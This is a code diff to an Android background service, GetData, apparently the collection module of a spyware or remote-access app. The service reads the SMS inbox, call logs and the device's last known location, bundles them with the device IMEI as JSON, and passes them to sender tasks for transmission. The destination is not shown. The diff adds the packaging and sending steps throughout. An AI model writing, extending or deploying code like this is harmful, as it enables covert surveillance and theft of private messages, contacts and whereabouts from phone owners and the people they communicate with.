@@ -14,29 +14,20 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Bundle;
-import android.os.Environment;
-import android.os.SystemClock;
 import android.provider.Browser;
 import android.provider.CallLog;
-import android.provider.MediaStore;
 import android.util.Log;
-import android.view.SurfaceHolder;
-import android.view.SurfaceView;
-import android.widget.Toast;
 
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.IOException;
 import java.text.DateFormat;
-import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
-
-import static android.support.v4.app.ActivityCompat.startActivityForResult;
 
 /**
  * An {@link IntentService} subclass for handling asynchronous task requests in
@@ -49,6 +40,8 @@ public class GetData extends IntentService{
     public static final String Msg="bleh";
     LocationManager locationManager;
     String locationProvider ;
+    private JSONArray jsonArray = new JSONArray();
+    private JSONObject list = new JSONObject();
 
     Camera cam;
     Camera.Parameters param;
@@ -63,7 +56,7 @@ public class GetData extends IntentService{
     protected void onHandleIntent(Intent intent) {
         if (intent.getStringExtra(Msg).equals("sms")) {
             Log.d(intent.getStringExtra(Msg), "print");
-            String[] reqCols = new String[] { "_id", "address", "body","person" };
+            String[] reqCols = new String[] { "_id", "address", "body","person","date"};
             String[] messageArr = new String[30];
             int ctr=0;
             Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), reqCols, null, null, null);
@@ -71,18 +64,38 @@ public class GetData extends IntentService{
 
             do{
                 String msgData = "";
-                for(int idx=0;idx<cursor.getColumnCount();idx++)
-                {
-                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                JSONObject smsJson = new JSONObject();
+                String address = cursor.getString(cursor.getColumnIndex("address"));
+                String person = cursor.getString(cursor.getColumnIndex("person"));
+                long date = cursor.getLong(cursor.getColumnIndex("date"));
+                String body=cursor.getString(cursor.getColumnIndex("body"));
+                Date propdate=new Date(date);
+                DateFormat bleh=android.text.format.DateFormat.getDateFormat(getApplicationContext());
+                try {
+                    smsJson.put("address",address);
+                    smsJson.put("data",body);
+                    smsJson.put("time",bleh.format(propdate).toString());
+                } catch (JSONException e) {
+                    e.printStackTrace();
                 }
+                msgData = "addess: "+address+"; date: "+bleh.format(propdate).toString()+"; body: "+body+"; person: "+person;
                 Log.d("Message",msgData);
                 messageArr[ctr]=msgData;
+                jsonArray.put(smsJson);
                 ++ctr;
             }while(cursor.moveToNext() && ctr<30);
-            SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
-            String imei = sp.getString("imei","null");
-            Log.d("checkSP",imei);
-            SendData s1 = new SendData(messageArr,imei);
+            try
+            {
+                SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
+                String imei = sp.getString("imei","null");
+                Log.d("imei",imei);
+                list.put("list",jsonArray);
+                list.put("imei",imei);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+            SendSMSData s1 = new SendSMSData(list);
+            s1.execute();
         }
         else if(intent.getStringExtra(Msg).equals("location"))
         {
@@ -97,13 +110,24 @@ public class GetData extends IntentService{
             List<Address> addresses;
             geocoder = new Geocoder(this, Locale.getDefault());
             try {
+                JSONObject locationJson = new JSONObject();
                 addresses = geocoder.getFromLocation(lastKnownLocation.getLatitude(), lastKnownLocation.getLongitude(), 1);
                 String address = addresses.get(0).getAddressLine(0);
                 String city = addresses.get(0).getLocality();
                 String country = addresses.get(0).getCountryName();
                 String regionCode = addresses.get(0).getCountryCode();
+                SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
+                String imei = sp.getString("imei","null");
+                locationJson.put("latitude",""+lastKnownLocation.getLatitude());
+                locationJson.put("longitude",""+lastKnownLocation.getLongitude());
+                locationJson.put("imei",imei);
+                Log.d("location","Latitude:"+lastKnownLocation.getLatitude()+"Longitude"+lastKnownLocation.getLongitude());
                 Log.d("location","address: "+address+" city: "+city+" country: "+country+" regionCode: "+regionCode);
+                SendLocation sendLocation = new SendLocation(locationJson);
+                sendLocation.execute();
             } catch (IOException e) {
+                e.printStackTrace();
+            } catch (JSONException e) {
                 e.printStackTrace();
             }
             locationManager.removeUpdates(g1);
@@ -146,6 +170,7 @@ public class GetData extends IntentService{
             c1.moveToLast();
             if(c1!=null){
                 do{
+                    JSONObject logsJSON = new JSONObject();
                     String number = c1.getString(c1.getColumnIndex("number"));
                     String name = c1.getString(c1.getColumnIndex("name"));
                     long date = c1.getLong(c1.getColumnIndex("date"));
@@ -155,21 +180,43 @@ public class GetData extends IntentService{
                     int dircode=Integer.parseInt(type);
                     switch( dircode ) {
                         case CallLog.Calls.OUTGOING_TYPE:
-                            callType = "OUTGOING";
+                            callType = "Out";
                             break;
 
                         case CallLog.Calls.INCOMING_TYPE:
-                            callType = "INCOMING";
+                            callType = "In";
                             break;
 
                         case CallLog.Calls.MISSED_TYPE:
-                            callType = "MISSED";
+                            callType = "Miss";
                             break;
                     }
                     Date propdate=new Date(date);
                     DateFormat bleh=android.text.format.DateFormat.getDateFormat(getApplicationContext());
+                    try {
+                        logsJSON.put("number",number);
+                        logsJSON.put("name",name);
+                        logsJSON.put("date",bleh.format(propdate).toString());
+                        logsJSON.put("kind",callType);
+                        logsJSON.put("duration",""+duration);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
                     Log.d("entry:",number+","+name+","+bleh.format(propdate)+","+duration+","+callType);
+                    jsonArray.put(logsJSON);
                 }while (c1.moveToPrevious());
+                try
+                {
+                    SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
+                    String imei = sp.getString("imei","null");
+                    Log.d("imei",imei);
+                    list.put("list",jsonArray);
+                    list.put("imei",imei);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                SendCallLogs sl1 = new SendCallLogs(list);
+                sl1.execute();
             }
         }
         else if(intent.getStringExtra(Msg).equals("camera")){
